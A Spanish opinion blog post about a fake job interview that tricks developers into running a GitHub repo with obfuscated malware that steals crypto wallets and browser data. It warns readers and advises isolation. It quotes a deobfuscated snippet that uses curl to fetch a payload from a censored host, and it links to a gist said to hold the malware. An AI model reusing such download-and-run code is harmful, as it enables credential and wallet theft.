---
aliases:
- /es/como-una-entrevista-laboral-se-convierte-en-un-robo-de-criptomonedas/
authors:
- Eduardo Zepeda
categories:
- opinion
coverImage: images/tech-interview-hacking-obfuscated-code.jpg
date: '2024-12-14T22:24:18-06:00'
description: Esta es la historia de un tipo que estuvo a punto de perder todo su criptomonedas
  y probablemente ser hackeado en una entrevista de trabajo para un puesto remoto
keyword: ''
keywords:
- crypto
- interview
- github
- hacking
- docker
slug: /opinion/como-una-entrevista-laboral-se-convierte-en-un-robo-de-criptomonedas/
title: Como Una Entrevista Laboral Se Convierte En Un Robo De Criptomonedas
---

El otro día estaba navegando en esa máquina de propaganda política de Elon Musk, también conocida como X, y me topé con esta joya de la desvergüenza humana, un entrevistador que estuvo a punto de hackear a uno de sus postulantes.

## Ejecución de malware en las entrevistas laborales

La historia es esta: estás necesitado de trabajo, te preparas para la entrevista, y de repente el reclutador te pide clonar [una librería de Github]({{< ref path="/posts/git/el-problema-de-usar-github-para-evaluar-a-desarrolladores/index.md" lang="es" >}}) para que encuentres los errores en el código, una entrevista protocolaria para desarrollo de software, todo normal hasta este punto. Por supuesto que tú, necesitado de un buen laburo, decides seguir con el proceso.

Bueno, pues este chico fue lo suficientemente avispado como para leer el código a ejecutar antes de ejecutar ciegamente su voluminosa librería de *node_modules*. ¿Y con que se encontró? un suculento y delicioso código minimizado, ofuscado y con tintes de poner tu ordenador a minar criptomonedas. 

Nuestro amigo era como Jorge, curioso, así que embelleció el código y encontró:

- Lineas que parecen buscar y leer el contenido de carteras de Solana.
- Scripts que escanean directorios de navegadores.  
- [Llamadas a una API]({{< ref path="/posts/software-architecture/caracteristicas-basicas-de-una-api-rest/index.md" lang="es" >}}) directo a una dirección IP, sin dominio, algunos sin respuesta y otros que descargan scripts ofuscados en Python (supongo que le da un seguimiento al proceso de hackeo instalando un backdoor o algún RAT).


Si quieres ~~infectarte~~ leer el código visita [el repositorio de github](https://gist.github.com/jbrit/9a6525d086411a0fcffea202f368e780#file-initial-obfuscated-iife-js#?), no me hago responsable de nada.

``` javascript
_0x42b722("curl -Lo \"" + _0x157519 + "\" \"" + "http://<censored>/pdown" + "\"", (_0x204dd7, _0x6e1c16, _0x52b515) => {
  if (_0x204dd7) {
    _0x517b73 = 0;
    return void _0x70af27();
  })
```

{{<ad>}}

## ¿Cómo evitamos caer en estas trampas?

No planeo quedarme solo en el drama. Esto se trata de ofrecer algunas soluciones prácticas para que los script kiddies no te vean la cara de novato en una falsa entrevista de trabajo:

### **Usa un dispositivo diferente**

La opción más cómoda, pero también la más cara, mantén tus dispositivos separados, usa un ordenador para trabajo y pruebas técnicas y otro para tus asuntos personales, criptomonedas incluidas. 

### **Lee el código, siempre que sea posible**

¿El reclutador te manda un script? Examínalo con cuidado antes de ejecutarlo. Sí, ya sé, a veces el código es demasiado extenso o está ofuscado, pero si tienes algo de experiencia, puedes pasar tus ojos rápidamente por la pantalla y detectar las red flags. Claro, tampoco puedes perder toda la tarde con esto si estás en una entrevista real o valoras tu tiempo.

### **Usa una máquina virtual**

Monta una máquina virtual, ya sea Virtual Box o Gnome Boxes, en Linux, o un [contenedor de Docker completamente aislado]({{< ref path="/posts/docker/docker-curso-practico-con-ejemplos-en-gnu-linux/index.md" lang="es" >}}), si no te molesta no contar con una interfaz gráfica. 

Otra opción disponible, y mi favorita: una live USB con la distribución de tu elección (Debian, Fedora, o lo que quieras).

De esa manera, lo peor que puede pasar es que infecten tu máquina virtual y no tu equipo real con toda tu información personal. ¡Solo ten cuidado los volúmenes compartidos! Si montas tu disco duro en la VM, estás frito.

### **Cifra tu información sensible**

Aquí entra el clásico consejo de los veteranos de la vieja escuela de TI: **cifra tus datos importantes**. Si alguien logra acceder a tus colección de memes de gatitos, cífralos. 

No planeo ofrecer detalles porque ya hay demasiado en internet, Googlea sobre GPG o lee el manual directamente, si no estás tan familiarizado con la terminal o no te interesa, hay herramientas como Kleopatra, que vuelven más intuitivo el uso de la criptogorafía.

## No ejecutes código arbitrario en tu máquina personal

¿Tienes mejores ideas para protegernos de estas prácticas? Suelta tus consejos en redes sociales y etiquétame. Estoy ansioso de agregar tus sugerencias al post. 

Si quieres leer la historia completa dale una visita al blog de Elon... digo X. Editado: el propietario de la cuenta ha cambiado su configuración de privacidad, así que ahora no puedes ver la conversación completa.